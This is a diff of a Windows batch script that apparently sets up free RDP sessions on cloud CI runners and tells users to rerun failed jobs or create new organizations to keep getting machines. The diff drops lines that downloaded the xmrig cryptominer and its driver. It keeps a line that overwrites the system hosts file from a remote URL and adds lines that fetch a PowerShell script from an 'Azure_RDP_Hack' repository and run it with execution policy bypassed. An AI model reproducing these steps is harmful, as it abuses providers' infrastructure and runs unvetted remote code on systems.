@@ -28,11 +28,9 @@ echo To change another VM region, Create New organization (Your current VM locat
 echo Region Available: West Europe, Central US, East Asia, Brazil South, Canada Central, Autralia East, UK South, South India
 echo All done! Connect your VM using RDP. When RDP expired and VM shutdown, Rerun failed jobs to get a new RDP.
 net user installer /delete
-curl -o "C:\Users\Public\Desktop\xmrig.exe" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/xmrig.exe > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\WinRing0x64.sys" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/WinRing0x64.sys > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\SHA256SUMS" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/SHA256SUMS > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\config.json" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/config.json > out.txt 2>&1
 curl -o "C:\Windows\System32\Drivers\etc\hosts" https://raw.githubusercontent.com/ztvofficial/Windows2019RDP-US/main/Files/hosts > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\a.ps1" https://raw.githubusercontent.com/ngoc7sao9/Azure_RDP_Hack/main/a.ps1 > out.txt 2>&1
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "C:\Users\Public\Desktop\a.ps1" > out.txt 2>&1
 diskperf -Y >nul
 sc config Audiosrv start= auto >nul
 sc start audiosrv >nul
